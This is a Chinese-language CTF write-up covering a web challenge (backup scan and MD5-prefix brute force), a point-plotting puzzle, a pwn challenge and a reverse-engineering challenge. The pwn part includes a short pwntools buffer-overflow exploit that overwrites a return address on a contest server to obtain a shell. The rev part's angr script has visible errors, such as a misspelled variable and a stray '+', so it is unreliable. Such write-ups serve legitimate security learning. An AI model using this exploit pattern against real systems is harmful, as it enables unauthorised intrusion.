##web1
看到hint御剑扫描后台得到www.zip，查看后端逻辑发现需要一个md5的前六位
![](https://i.imgur.com/wd3SX9I.png)
burp抓包发现int（.....）![](https://i.imgur.com/b7KI6oX.png)
写一个脚本跑一下![](https://i.imgur.com/fwqwd89.png)
![](https://i.imgur.com/FCDCjpm.png) 
输入得到flag![](https://i.imgur.com/P89sUWU.png)
##poit
看到有许多坐标，百度了一下可能是数控轨道，用CAXA把数据跑一下得到flag![](https://i.imgur.com/zcY3IOz.jpg)
## pwn

### 1. Password checker
![](https://i.imgur.com/zg2YTKx.png)

![](https://i.imgur.com/piIJodG.png)
from ctypes import *
import time

p=remote('ctf.asuri.org',20002)
p.sendline('a'*(260-4))
p.sendline('s'+p32(0x8048674)*8)
p.interactive()

然后打开home/ctf/flag

## rev

### middle

import angr,string
import claripy
import pickle
import sys
import logging
import time
logging.getLogger('angr').setLevel('WARNING')

p = angr.Project('./middle.bin', load_options={'auto_load_libs': False})+

def decode():                                 
    symbols = [claripy.BVS('crypto%d' % i, 8) for i in range(24)]
    
    Content = claripy.Concat(*symbols)
    Stat0e = p.factory.blank_state(
        addr=0x000000080488EB ,
        stdin=Content,
        remove_options={}
    )
    key = [claripy.BVS('key%d' % i, 8) for i in range(4)]
    state.memory.store(0x804A0D4,claripy.Concat(*key),4)
      
    for k in symbols:
        state.solver.add(k != 10)
        so1=state.solver.And( k > 8, k < 14)
        so2=state.solver.And( k > 31, k < 127)
        state.solver.add(state.solver.Or(so1,so2)==True)
    @p.hook(0x00000080489C3, length=5)
    def index(_state):
        print(_state, '233333')
    @p.hook(0x0000804882A, length=0)
    def index(_state):
        print(_state, '0x0000804882A')
    
    @p.hook(0x0008048831 , length=6)
    def index(_state):
        print(_state, 'pass')


​        
    @p.hook(0x00804883E, length=0)
    def index(_state):
        print(_state, 'no pass')
    
    @p.hook(0x0008048863 , length=0)
    def index(_state):
        print(_state, '08048899')
      
    simulation = p.factory.simulation_manager(state)
    res = simulation.explore(find=0x0080488AF ,avoid=[0x080488BD ]) 
    print(len(res.found))
    result = []
    for pp in res.found:
        tmp = pp.solver.eval_upto(Content, 10,cast_to=bytes)
        print('yes',tmp)
        tmp = pp.solver.eval_upto(claripy.Concat(*key),10, cast_to=bytes)
        print('yes',tmp)
if __name__ == "__main__":
    decode()